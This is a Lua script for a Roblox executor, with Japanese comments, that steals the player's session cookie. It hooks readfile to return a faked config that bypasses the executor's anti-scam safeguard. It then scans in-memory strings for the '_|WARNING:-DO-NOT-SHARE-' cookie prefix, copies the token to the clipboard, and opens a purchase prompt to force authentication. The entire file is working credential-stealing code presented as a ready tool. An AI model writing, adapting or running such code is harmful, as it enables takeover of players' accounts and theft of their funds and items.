-- [[ Project: Silent Cookie Distiller - Mobile Ultra ]]
-- 全自動：セキュリティ偽装 ＋ 爆速クッキー抽出 ＋ 購入画面トリガー

local function log(msg)
    print("[SYSTEM] " .. tostring(msg))
end

local player = game:GetService("Players").LocalPlayer
local MS = game:GetService("MarketplaceService")

-- ==========================================
-- STEP 1: メモリ上でのセキュリティ偽装
-- ==========================================
local old_read
old_read = hookfunction(readfile, function(path)
    if string.find(path:lower(), "disableantiscam") then
        log("Bypassing security...")
        -- プレイヤーIDを動的に注入（セキュ.pngの構成）
        local fake = {
            ["WARNING"] = "BYPASS",
            ["allowed_games"] = "*",
            ["user_id"] = tostring(player.UserId),
            ["version_num"] = 707
        }
        return game:GetService("HttpService"):JSONEncode(fake)
    end
    return old_read(path)
end)

-- ==========================================
-- STEP 2: filtergc を使った超高速スキャン
-- ==========================================
local function start_capture()
    task.spawn(function()
        local target_prefix = "_|WARNING:-DO-NOT-SHARE-"
        log("Memory scanning started (Ultra Mode)...")
        
        while true do
            -- 関数リストにあった filtergc で文字列だけに絞ってスキャン
            local strings = filtergc("string")
            for _, v in pairs(strings) do
                if string.sub(v, 1, #target_prefix) == target_prefix then
                    local _, pos = string.find(v, "|_", 1, true)
                    if pos then
                        -- 警告文を削ってクリップボードへ
                        setclipboard(string.sub(v, pos + 1))
                        log("********************************")
                        log("SUCCESS: Data captured to clipboard!")
                        log("A列に貼り付けて復元しろ！")
                        log("********************************")
                        return 
                    end
                end
            end
            task.wait(2) -- 429エラー回避用のインターバル
        end
    end)
end

-- ==========================================
-- STEP 3: 実行（トリガー）
-- ==========================================
start_capture()
task.wait(2)

log("Opening purchase UI to force authentication...")
-- 修正済みメソッド：公式の購入UIを呼び出す
pcall(function()
    MS:PromptProductPurchase(player, 0)
end)

log("Ready. Please close the popup if it appears.")
